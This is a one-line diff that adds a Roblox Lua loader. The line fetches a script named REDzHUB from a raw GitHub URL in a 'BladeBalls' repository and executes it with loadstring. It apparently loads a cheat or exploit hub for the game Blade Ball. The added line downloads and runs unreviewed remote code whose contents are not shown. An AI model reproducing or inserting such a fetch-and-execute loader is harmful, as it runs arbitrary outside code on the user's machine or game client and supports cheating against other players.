@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hercules4328/BladeBalls/refs/heads/main/REDzHUB"))()
